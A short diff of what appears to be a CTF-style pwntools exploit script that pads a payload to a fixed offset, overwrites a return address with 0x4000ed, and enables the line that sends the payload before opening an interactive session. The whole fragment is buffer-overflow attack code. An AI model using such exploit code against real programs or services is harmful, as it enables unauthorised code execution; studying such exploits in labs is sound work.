@@ -13,7 +13,7 @@ p += 'D' * ( 0x128 - len( p ) )
 p += p64( 0x4000ed )
 p += 'a' * ( 322 - len( p ) )
 
-#y.send( p )
+y.send( p )
 
 
 y.interactive()
